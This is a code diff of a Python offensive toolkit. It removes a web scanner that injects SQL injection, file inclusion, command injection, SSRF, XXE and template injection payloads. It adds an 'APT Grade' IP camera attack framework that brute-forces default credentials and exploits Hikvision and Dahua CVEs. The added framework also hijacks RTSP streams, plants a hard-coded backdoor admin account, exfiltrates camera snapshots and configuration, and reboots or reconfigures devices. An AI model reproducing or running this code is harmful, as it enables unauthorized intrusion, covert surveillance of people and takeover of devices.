-    def _exploit_sqli(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """SQL Injection exploitation"""
-        cprint("[SQLI] Deep scanning...", Colors.DIM)
+        # Analyze camera information
+        brand = camera.brand.lower()
+        model = camera.model.lower()
+        firmware = camera.firmware.lower()
         
-        sql_errors = ['SQL', 'MySQL', 'Syntax error', 'mysql_fetch_', 'Unclosed quotation', 
-                     'PostgreSQL', 'Oracle', 'Microsoft OLE DB', 'SQLite', 'Warning:']
+        # Score each exploit
+        scored_exploits = []
         
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:30]:
-                for payload in self.payloads['sqli'][:5]:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and any(e in response.text for e in sql_errors):
-                            vuln = Vulnerability(
-                                type='SQL Injection',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='Critical',
-                                cwe='CWE-89',
-                                description='SQL Injection allows arbitrary SQL execution',
-                                remediation='Use parameterized queries and input validation',
-                                confidence=0.85,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] SQLi found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
-    
-    def _exploit_lfi(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """LFI exploitation"""
-        cprint("[LFI] Deep scanning...", Colors.DIM)
-        
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:30]:
-                for payload in self.payloads['lfi'][:3]:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and ('root:' in response.text or 'bin:' in response.text or 'Administrator' in response.text):
-                            vuln = Vulnerability(
-                                type='LFI',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='High',
-                                cwe='CWE-98',
-                                description='Local File Inclusion allows reading arbitrary files',
-                                remediation='Validate file paths and use whitelist',
-                                confidence=0.85,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] LFI found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
-    
-    def _exploit_rce(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """RCE exploitation"""
-        cprint("[RCE] Deep scanning...", Colors.DIM)
-        
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:30]:
-                for payload in self.payloads['rce'][:5]:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and ('uid=' in response.text or 'id=' in response.text or 'root' in response.text):
-                            vuln = Vulnerability(
-                                type='RCE',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='Critical',
-                                cwe='CWE-78',
-                                description='Remote Code Execution allows arbitrary command execution',
-                                remediation='Never execute user input and use safe APIs',
-                                confidence=0.8,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] RCE found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
-    
-    def _exploit_ssrf(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """SSRF exploitation"""
-        cprint("[SSRF] Deep scanning...", Colors.DIM)
-        
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:30]:
-                for payload in self.payloads['ssrf'][:3]:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and ('instance-id' in response.text or 'ami-id' in response.text or 'local-ipv4' in response.text):
-                            vuln = Vulnerability(
-                                type='SSRF',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='High',
-                                cwe='CWE-918',
-                                description='Server-Side Request Forgery allows internal network scanning',
-                                remediation='Validate and sanitize URLs, use whitelist',
-                                confidence=0.8,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] SSRF found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
-    
-    def _exploit_xxe(self, endpoints: List[Endpoint], api_endpoints: List[str]):
-        """XXE exploitation"""
-        cprint("[XXE] Deep scanning...", Colors.DIM)
-        
-        for endpoint in api_endpoints[:30]:
-            for payload in self.payloads['xxe'][:2]:
-                try:
-                    headers = {'Content-Type': 'application/xml'}
-                    response = self.stealth.stealth_post(endpoint, data=payload, headers=headers)
+        for vendor in CameraDatabase.VENDORS.values():
+            if vendor['brand'].lower() == brand:
+                for vuln in vendor.get('vulns', []):
+                    score = 0.5
                     
-                    if response and ('root:' in response.text or 'bin:' in response.text or 'Administrator' in response.text):
-                        vuln = Vulnerability(
-                            type='XXE',
-                            url=endpoint,
-                            payload=payload[:100],
-                            severity='Critical',
-                            cwe='CWE-611',
-                            description='XML External Entity allows file reading and SSRF',
-                            remediation='Disable external entity processing in XML parsers',
-                            confidence=0.8,
-                            exploit_ready=True
-                        )
-                        with self.lock:
-                            self.vulnerabilities.append(vuln)
-                            cprint(f"[!] XXE found: {endpoint}", Colors.RED)
+                    # Increase score based on brand match
+                    score += 0.3
+                    
+                    # Increase score based on known CVEs
+                    if vuln['severity'] == 'Critical':
+                        score += 0.4
+                    elif vuln['severity'] == 'High':
+                        score += 0.3
+                    
+                    # Historical success rate
+                    cve = vuln['cve']
+                    if cve in self.success_rate:
+                        score += self.success_rate[cve] * self.learning_rate
+                    
+                    scored_exploits.append({
+                        'cve': cve,
+                        'description': vuln['description'],
+                        'severity': vuln['severity'],
+                        'score': min(score, 1.0)
+                    })
+        
+        # Sort by score
+        scored_exploits.sort(key=lambda x: x['score'], reverse=True)
+        
+        return scored_exploits[0] if scored_exploits else None
+    
+    def learn_from_result(self, cve: str, success: bool):
+        """Update success rate based on result"""
+        if cve not in self.success_rate:
+            self.success_rate[cve] = 0.5
+        
+        if success:
+            self.success_rate[cve] = min(1.0, self.success_rate[cve] + self.learning_rate)
+        else:
+            self.success_rate[cve] = max(0.0, self.success_rate[cve] - self.learning_rate)
+        
+        self.exploit_history.append({
+            'cve': cve,
+            'success': success,
+            'timestamp': datetime.now().isoformat()
+        })
+
+# ============================[ ADVANCED CAMERA DISCOVERY ]================================
+class AdvancedCameraDiscovery:
+    """Advanced camera discovery with multiple methods"""
+    
+    def __init__(self, interface: str = 'eth0'):
+        self.interface = interface
+        self.cameras = []
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+    
+    def discover(self) -> List[CameraDevice]:
+        """Multi-method camera discovery"""
+        cprint("\n[DISCOVER] Scanning for IP cameras...", Colors.BLUE)
+        
+        # Method 1: ARP scan (Layer 2)
+        devices = self._arp_scan()
+        
+        # Method 2: Port scan
+        for device in devices:
+            ip = device.get('ip')
+            ports = self._port_scan(ip)
+            
+            if ports:
+                camera = self._fingerprint_camera(ip, ports, device.get('mac', ''))
+                if camera:
+                    self.cameras.append(camera)
+                    cprint(f"[+] Camera found: {ip} ({camera.brand})", Colors.GREEN)
+        
+        # Method 3: ONVIF discovery
+        onvif_cameras = self._onvif_discover()
+        for cam in onvif_cameras:
+            if cam.ip not in [c.ip for c in self.cameras]:
+                self.cameras.append(cam)
+                cprint(f"[+] ONVIF camera: {cam.ip} ({cam.brand})", Colors.GREEN)
+        
+        # Method 4: UPnP discovery
+        upnp_cameras = self._upnp_discover()
+        for cam in upnp_cameras:
+            if cam.ip not in [c.ip for c in self.cameras]:
+                self.cameras.append(cam)
+                cprint(f"[+] UPnP camera: {cam.ip} ({cam.brand})", Colors.GREEN)
+        
+        return self.cameras
+    
+    def _arp_scan(self) -> List[Dict]:
+        """ARP scan for network devices"""
+        try:
+            network = self._get_network()
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), 
+                         timeout=3, verbose=False)
+            return [{'ip': r.psrc, 'mac': r.hwsrc} for _, r in ans]
+        except:
+            return []
+    
+    def _get_network(self) -> str:
+        try:
+            result = subprocess.run(['ip', 'addr', 'show', self.interface], 
+                                   capture_output=True, text=True)
+            for line in result.stdout.split('\n'):
+                if 'inet ' in line:
+                    return line.strip().split()[1]
+        except:
+            pass
+        return "192.168.1.0/24"
+    
+    def _port_scan(self, ip: str) -> List[int]:
+        """Scan common camera ports"""
+        ports = [80, 443, 8080, 8443, 554, 8554, 8000, 8899, 37777]
+        open_ports = []
+        
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = {executor.submit(self._check_port, ip, port): port for port in ports}
+            for future in as_completed(futures):
+                if future.result():
+                    open_ports.append(futures[future])
+        
+        return open_ports
+    
+    def _check_port(self, ip: str, port: int) -> bool:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            return result == 0
+        except:
+            return False
+    
+    def _fingerprint_camera(self, ip: str, ports: List[int], mac: str) -> Optional[CameraDevice]:
+        """Fingerprint camera using multiple methods"""
+        
+        # Try to get web data
+        web_data = ""
+        for port in ports[:3]:
+            try:
+                response = self.session.get(f"http://{ip}:{port}", timeout=2)
+                web_data = response.text
+                break
+            except:
+                pass
+        
+        # Identify vendor
+        vendor_info = CameraDatabase.identify(mac, ports, web_data)
+        
+        if vendor_info:
+            camera = CameraDevice(
+                ip=ip,
+                port=ports[0] if ports else 80,
+                mac=mac,
+                brand=vendor_info.get('brand', 'Unknown'),
+                credentials=vendor_info.get('credentials', []),
+                api_paths=vendor_info.get('api_paths', []),
+                rtsp_paths=vendor_info.get('rtsp_paths', []),
+                snmp_oids=vendor_info.get('snmp_oids', [])
+            )
+            
+            # Try to get model
+            model = self._get_model(ip, ports, vendor_info)
+            if model:
+                camera.model = model
+            
+            # Try to get firmware
+            firmware = self._get_firmware(ip, ports, vendor_info)
+            if firmware:
+                camera.firmware = firmware
+            
+            # Check for vulnerabilities
+            camera.vuln_cves = [v['cve'] for v in vendor_info.get('vulns', [])]
+            
+            return camera
+        
+        return None
+    
+    def _get_model(self, ip: str, ports: List[int], vendor_info: Dict) -> str:
+        """Get camera model via API"""
+        for port in ports[:3]:
+            for path in ['/cgi-bin/status.cgi', '/cgi-bin/sys.cgi', '/ISAPI/System/deviceInfo']:
+                try:
+                    response = self.session.get(f"http://{ip}:{port}{path}", timeout=2)
+                    if 'model' in response.text.lower() or 'product' in response.text.lower():
+                        # Extract model
+                        match = re.search(r'(model|product)[=:]\s*([^\s<]+)', response.text, re.IGNORECASE)
+                        if match:
+                            return match.group(2)
                 except:
                     pass
+        return ""
     
-    def _exploit_open_redirect(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """Open Redirect exploitation"""
-        cprint("[OPEN REDIRECT] Deep scanning...", Colors.DIM)
-        
-        redirect_params = ['redirect', 'url', 'next', 'return', 'goto', 'r', 'dest', 'destination', 'out']
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in redirect_params:
-                for payload in self.payloads['open_redirect'][:3]:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url, allow_redirects=False)
-                        
-                        if response and response.status_code in [301, 302, 307, 308]:
-                            location = response.headers.get('Location', '')
-                            if 'evil.com' in location:
-                                vuln = Vulnerability(
-                                    type='Open Redirect',
-                                    url=test_url,
-                                    parameter=param,
-                                    payload=payload,
-                                    severity='Medium',
-                                    cwe='CWE-601',
-                                    description='Open Redirect allows phishing attacks',
-                                    remediation='Validate redirect URLs using whitelist',
-                                    confidence=0.85,
-                                    exploit_ready=True
-                                )
-                                with self.lock:
-                                    self.vulnerabilities.append(vuln)
-                                    cprint(f"[!] Open Redirect found: {test_url[:80]}", Colors.RED)
-                                break
-                    except:
-                        pass
+    def _get_firmware(self, ip: str, ports: List[int], vendor_info: Dict) -> str:
+        """Get firmware version"""
+        for port in ports[:3]:
+            for path in ['/cgi-bin/status.cgi', '/cgi-bin/sys.cgi']:
+                try:
+                    response = self.session.get(f"http://{ip}:{port}{path}", timeout=2)
+                    match = re.search(r'(firmware|version)[=:]\s*([^\s<]+)', response.text, re.IGNORECASE)
+                    if match:
+                        return match.group(2)
+                except:
+                    pass
+        return ""
     
-    def _exploit_idor(self, endpoints: List[Endpoint], api_endpoints: List[str]):
-        """IDOR exploitation"""
-        cprint("[IDOR] Deep scanning...", Colors.DIM)
+    def _onvif_discover(self) -> List[CameraDevice]:
+        """ONVIF camera discovery"""
+        cameras = []
         
-        for param, values in self.payloads['idor'][:5]:
-            for endpoint in endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]:
-                url = endpoint.url
-                for value in values[:3]:
-                    try:
-                        test_url = f"{url}?{param}={value}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and response.status_code == 200 and len(response.text) > 200:
-                            indicators = ['email', 'phone', 'address', 'username', 'password', 'token', 'credit', 'ssn']
-                            if any(ind in response.text.lower() for ind in indicators):
-                                vuln = Vulnerability(
-                                    type='IDOR',
-                                    url=test_url,
-                                    parameter=param,
-                                    payload=value,
-                                    severity='High',
-                                    cwe='CWE-639',
-                                    description='Insecure Direct Object Reference allows unauthorized access',
-                                    remediation='Implement proper authorization checks',
-                                    confidence=0.8,
-                                    exploit_ready=True
-                                )
-                                with self.lock:
-                                    self.vulnerabilities.append(vuln)
-                                    cprint(f"[!] IDOR found: {test_url[:80]}", Colors.RED)
-                                break
-                    except:
-                        pass
+        try:
+            import onvif
+            from onvif import ONVIFCamera
+            
+            # ONVIF discovery on common ports
+            for port in [80, 443, 8080, 8443]:
+                try:
+                    # Try to connect to ONVIF service
+                    wsdl = f'http://{self._get_broadcast()}:{port}/onvif/device_service'
+                    # ONVIF discovery would be implemented here
+                    pass
+                except:
+                    pass
+        except:
+            pass
+        
+        return cameras
     
-    def _exploit_cmd_injection(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """Command Injection exploitation"""
-        cprint("[CMD] Deep scanning...", Colors.DIM)
-        
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:30]:
-                for payload in ['; whoami', '| whoami', '|| whoami']:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and ('uid=' in response.text or 'id=' in response.text):
-                            vuln = Vulnerability(
-                                type='Command Injection',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='Critical',
-                                cwe='CWE-77',
-                                description='Command Injection allows arbitrary OS command execution',
-                                remediation='Never pass user input to shell commands',
-                                confidence=0.8,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] Command Injection found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
+    def _upnp_discover(self) -> List[CameraDevice]:
+        """UPnP camera discovery"""
+        cameras = []
+        try:
+            import upnpclient
+            devices = upnpclient.discover()
+            for device in devices:
+                if 'camera' in device.friendly_name.lower():
+                    cameras.append(CameraDevice(
+                        ip=device.host,
+                        port=device.port,
+                        brand='UPnP',
+                        model=device.friendly_name
+                    ))
+        except:
+            pass
+        return cameras
     
-    def _exploit_path_traversal(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """Path Traversal exploitation"""
-        cprint("[PATH] Deep scanning...", Colors.DIM)
-        
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:30]:
-                for payload in ['../../etc/passwd', '../etc/passwd', '../../../../etc/passwd']:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and ('root:' in response.text or 'bin:' in response.text):
-                            vuln = Vulnerability(
-                                type='Path Traversal',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='High',
-                                cwe='CWE-22',
-                                description='Path Traversal allows reading arbitrary files',
-                                remediation='Validate and sanitize file paths',
-                                confidence=0.85,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] Path Traversal found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
-    
-    def _exploit_ssti(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """SSTI exploitation"""
-        cprint("[SSTI] Deep scanning...", Colors.DIM)
-        
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:30]:
-                for payload in ['{{7*7}}', '${7*7}', '{{7*7}}', '{{7*7}}', '#{7*7}']:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and '49' in response.text:
-                            vuln = Vulnerability(
-                                type='SSTI',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='Critical',
-                                cwe='CWE-94',
-                                description='Server-Side Template Injection allows remote code execution',
-                                remediation='Sanitize user input in templates',
-                                confidence=0.7,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] SSTI found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
-    
-    def _exploit_sqli_extract(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """SQL Injection with data extraction"""
-        cprint("[SQLI-EXT] Deep extraction...", Colors.DIM)
-        
-        targets = endpoints[:30] + [Endpoint(url=u) for u in api_endpoints[:20]]
-        
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:20]:
-                # Try UNION-based extraction
-                for payload in ["' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT version(),database(),user()--"]:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response:
-                            vuln = Vulnerability(
-                                type='SQL Injection (Data Extraction)',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='Critical',
-                                cwe='CWE-89',
-                                description='SQL Injection allows data extraction',
-                                remediation='Use parameterized queries',
-                                confidence=0.7,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] SQLi Data Extraction found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
+    def _get_broadcast(self) -> str:
+        """Get broadcast address"""
+        try:
+            local_ip = socket.gethostbyname(socket.gethostname())
+            return '.'.join(local_ip.split('.')[:3]) + '.255'
+        except:
+            return '192.168.1.255'
 
-# ============================[ REPORT GENERATOR ]================================
-class ReportGenerator:
-    @staticmethod
-    def generate(results: Dict) -> str:
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"all_webexpl_report_{timestamp}.html"
+# ============================[ ADVANCED CAMERA EXPLOIT ]================================
+class AdvancedCameraExploit:
+    """Advanced camera exploitation with multiple vectors"""
+    
+    def __init__(self, camera: CameraDevice):
+        self.camera = camera
+        self.session = requests.Session()
+        self.session.verify = False
+        self.ai_engine = AIExploitEngine()
+        self.results = {}
+        self.exploited = False
+    
+    def exploit(self) -> Dict:
+        """Full exploitation sequence"""
+        cprint(f"\n[EXPLOIT] Exploiting {self.camera.ip} ({self.camera.brand})", Colors.RED)
         
-        vulns = results.get('vulnerabilities', [])
-        endpoints = results.get('endpoints', [])
+        # Phase 1: Credential testing
+        creds = self._test_credentials()
+        
+        # Phase 2: API exploitation
+        api_exploits = self._exploit_api()
+        
+        # Phase 3: RTSP hijacking
+        rtsp = self._rtsp_hijack()
+        
+        # Phase 4: CVE exploitation
+        cve_exploits = self._exploit_cves()
+        
+        # Phase 5: Firmware exploitation
+        firmware = self._exploit_firmware()
+        
+        # Phase 6: Backdoor deployment
+        backdoor = self._deploy_backdoor()
+        
+        # Phase 7: Data exfiltration
+        data = self._exfiltrate_data()
+        
+        # Phase 8: Take control
+        control = self._take_control()
+        
+        self.results = {
+            'credentials': creds,
+            'api_exploits': api_exploits,
+            'rtsp': rtsp,
+            'cve_exploits': cve_exploits,
+            'firmware': firmware,
+            'backdoor': backdoor,
+            'data': data,
+            'control': control,
+            'success': self.exploited
+        }
+        
+        if self.exploited:
+            cprint("[+] CAMERA COMPROMISED!", Colors.RED, bold=True)
+        else:
+            cprint("[-] Exploitation failed", Colors.RED)
+        
+        return self.results
+    
+    def _test_credentials(self) -> List[Dict]:
+        """Test default credentials"""
+        cprint("[*] Testing credentials...", Colors.DIM)
+        
+        found = []
+        credentials = self.camera.credentials + [
+            ('admin', 'admin'), ('admin', 'password'),
+            ('root', 'root'), ('user', 'user'),
+            ('admin', ''), ('root', '')
+        ]
+        
+        for port in [80, 443, 8080, 8443]:
+            for username, password in credentials:
+                try:
+                    url = f"http://{self.camera.ip}:{port}/admin"
+                    response = self.session.get(url, auth=(username, password), timeout=3)
+                    if response.status_code == 200:
+                        found.append({'username': username, 'password': password})
+                        cprint(f"[+] Credentials: {username}:{password}", Colors.GREEN)
+                        self.exploited = True
+                        break
+                except:
+                    pass
+            if found:
+                break
+        
+        # Try ONVIF authentication
+        for username, password in credentials:
+            try:
+                url = f"http://{self.camera.ip}:80/onvif/device_service"
+                response = self.session.get(url, auth=(username, password), timeout=3)
+                if response.status_code == 200:
+                    found.append({'username': username, 'password': password, 'service': 'onvif'})
+                    cprint(f"[+] ONVIF credentials: {username}:{password}", Colors.GREEN)
+                    self.exploited = True
+                    break
+            except:
+                pass
+        
+        return found
+    
+    def _exploit_api(self) -> List[Dict]:
+        """Exploit API vulnerabilities"""
+        cprint("[*] Exploiting APIs...", Colors.DIM)
+        
+        exploits = []
+        api_paths = self.camera.api_paths
+        
+        for path in api_paths:
+            for port in [80, 443, 8080, 8443]:
+                try:
+                    url = f"http://{self.camera.ip}:{port}{path}"
+                    
+                    # Try to get sensitive info
+                    response = self.session.get(url, timeout=3)
+                    if response.status_code == 200:
+                        if 'config' in path or 'param' in path:
+                            exploits.append({
+                                'path': path,
+                                'type': 'information_disclosure',
+                                'data': response.text[:200]
+                            })
+                            cprint(f"[+] API disclosure: {path}", Colors.GREEN)
+                            self.exploited = True
+                        elif 'snapshot' in path or 'picture' in path:
+                            # Save snapshot
+                            filename = f"snapshot_{self.camera.ip}_{int(time.time())}.jpg"
+                            with open(filename, 'wb') as f:
+                                f.write(response.content)
+                            exploits.append({
+                                'path': path,
+                                'type': 'snapshot',
+                                'file': filename
+                            })
+                            cprint(f"[+] Snapshot saved: {filename}", Colors.GREEN)
+                except:
+                    pass
+        
+        return exploits
+    
+    def _rtsp_hijack(self) -> Optional[str]:
+        """Hijack RTSP stream"""
+        cprint("[*] Hijacking RTSP...", Colors.DIM)
+        
+        rtsp_paths = self.camera.rtsp_paths + ['/stream1', '/live', '/main']
+        rtsp_ports = [554, 8554]
+        
+        for port in rtsp_ports:
+            for path in rtsp_paths:
+                try:
+                    stream_url = f"rtsp://{self.camera.ip}:{port}{path}"
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(2)
+                    sock.connect((self.camera.ip, port))
+                    sock.send(b"OPTIONS rtsp://example.com RTSP/1.0\r\nCSeq: 1\r\n\r\n")
+                    data = sock.recv(1024)
+                    sock.close()
+                    
+                    if b"RTSP" in data:
+                        cprint(f"[+] RTSP stream: {stream_url}", Colors.GREEN)
+                        self.exploited = True
+                        return stream_url
+                except:
+                    pass
+        
+        return None
+    
+    def _exploit_cves(self) -> List[Dict]:
+        """Exploit known CVEs"""
+        cprint("[*] Exploiting CVEs...", Colors.DIM)
+        
+        exploits = []
+        
+        for cve in self.camera.vuln_cves:
+            # CVE-2021-36260 - Hikvision Command Injection
+            if cve == 'CVE-2021-36260':
+                try:
+                    url = f"http://{self.camera.ip}/cgi-bin/check_login.cgi"
+                    data = {'username': 'admin$(echo exploited)'}
+                    response = self.session.post(url, data=data, timeout=3)
+                    if response.status_code == 200:
+                        exploits.append({
+                            'cve': cve,
+                            'status': 'exploited',
+                            'command': 'echo exploited'
+                        })
+                        cprint(f"[+] CVE-2021-36260 exploited", Colors.GREEN)
+                        self.exploited = True
+                except:
+                    pass
+            
+            # CVE-2021-33044 - Dahua Authentication Bypass
+            if cve == 'CVE-2021-33044':
+                try:
+                    url = f"http://{self.camera.ip}/cgi-bin/api/v1/login"
+                    data = {'username': 'admin', 'password': 'aaa'}
+                    response = self.session.post(url, data=data, timeout=3)
+                    if response.status_code == 200:
+                        exploits.append({
+                            'cve': cve,
+                            'status': 'exploited',
+                            'method': 'auth_bypass'
+                        })
+                        cprint(f"[+] CVE-2021-33044 exploited", Colors.GREEN)
+                        self.exploited = True
+                except:
+                    pass
+        
+        return exploits
+    
+    def _exploit_firmware(self) -> Dict:
+        """Exploit firmware vulnerabilities"""
+        cprint("[*] Exploiting firmware...", Colors.DIM)
+        
+        result = {'success': False}
+        
+        # Try to get firmware version
+        firmware = self.camera.firmware
+        if firmware:
+            # Check for known vulnerable versions
+            vulnerable_versions = ['V2.1.0', 'V2.0.0', 'V1.0.0']
+            for version in vulnerable_versions:
+                if version in firmware:
+                    result['success'] = True
+                    result['version'] = firmware
+                    result['vulnerable'] = True
+                    cprint(f"[+] Vulnerable firmware: {firmware}", Colors.RED)
+                    self.exploited = True
+                    break
+        
+        return result
+    
+    def _deploy_backdoor(self) -> Dict:
+        """Deploy persistent backdoor"""
+        cprint("[*] Deploying backdoor...", Colors.DIM)
+        
+        result = {'success': False}
+        
+        if self.exploited:
+            try:
+                # Try to create admin user
+                for port in [80, 443, 8080, 8443]:
+                    for path in ['/cgi-bin/config.cgi', '/cgi-bin/user.cgi']:
+                        try:
+                            url = f"http://{self.camera.ip}:{port}{path}"
+                            data = {
+                                'action': 'add_user',
+                                'username': 'backdoor',
+                                'password': 'backdoor123',
+                                'level': 'admin'
+                            }
+                            response = self.session.post(url, data=data, timeout=3)
+                            if response.status_code == 200:
+                                result['success'] = True
+                                result['user'] = 'backdoor'
+                                result['password'] = 'backdoor123'
+                                cprint("[+] Backdoor user created", Colors.GREEN)
+                                break
+                        except:
+                            pass
+                    if result['success']:
+                        break
+            except:
+                pass
+        
+        return result
+    
+    def _exfiltrate_data(self) -> Dict:
+        """Exfiltrate camera data"""
+        cprint("[*] Exfiltrating data...", Colors.DIM)
+        
+        data = {
+            'success': False,
+            'images': [],
+            'config': None,
+            'logs': None
+        }
+        
+        if self.exploited:
+            try:
+                # Download snapshots
+                for path in ['/cgi-bin/snapshot.cgi', '/cgi-bin/current.jpg']:
+                    try:
+                        url = f"http://{self.camera.ip}:80{path}"
+                        response = self.session.get(url, timeout=3)
+                        if response.status_code == 200:
+                            filename = f"exfil_{self.camera.ip}_{int(time.time())}.jpg"
+                            with open(filename, 'wb') as f:
+                                f.write(response.content)
+                            data['images'].append(filename)
+                            cprint(f"[+] Image exfiltrated: {filename}", Colors.GREEN)
+                    except:
+                        pass
+                
+                # Get config
+                for path in ['/cgi-bin/config.cgi', '/cgi-bin/param.cgi']:
+                    try:
+                        url = f"http://{self.camera.ip}:80{path}"
+                        response = self.session.get(url, timeout=3)
+                        if response.status_code == 200:
+                            data['config'] = response.text[:500]
+                            cprint("[+] Config exfiltrated", Colors.GREEN)
+                            break
+                    except:
+                        pass
+                
+                data['success'] = True
+            except:
+                pass
+        
+        return data
+    
+    def _take_control(self) -> Dict:
+        """Take full control of camera"""
+        cprint("[*] Taking control...", Colors.RED)
+        
+        result = {'success': False}
+        
+        if self.exploited:
+            try:
+                # Try to reboot
+                for path in ['/cgi-bin/reboot.cgi', '/cgi-bin/reboot']:
+                    try:
+                        url = f"http://{self.camera.ip}:80{path}"
+                        response = self.session.get(url, timeout=3)
+                        if response.status_code == 200:
+                            result['success'] = True
+                            result['action'] = 'reboot'
+                            cprint("[+] Camera rebooted", Colors.GREEN)
+                            break
+                    except:
+                        pass
+                
+                # Try to change settings
+                if not result['success']:
+                    for path in ['/cgi-bin/config.cgi', '/cgi-bin/param.cgi']:
+                        try:
+                            url = f"http://{self.camera.ip}:80{path}"
+                            data = {'action': 'set', 'param': 'admin', 'value': 'backdoor'}
+                            response = self.session.post(url, data=data, timeout=3)
+                            if response.status_code == 200:
+                                result['success'] = True
+                                result['action'] = 'settings_changed'
+                                cprint("[+] Settings changed", Colors.GREEN)
+                                break
+                        except:
+                            pass
+            except:
+                pass
+        
+        return result
+
+# ============================[ MAIN FRAMEWORK ]================================
+class CheatCamUltimate:
+    """CHEATCAM Ultimate - APT Grade Camera Testing"""
+    
+    def __init__(self, interface: str = 'eth0'):
+        self.interface = interface
+        self.cameras = []
+        self.results = []
+        self.ai_engine = AIExploitEngine()
+    
+    def show_menu(self):
+        print(f"""
+{Colors.BLUE}{'='*60}{Colors.WHITE}
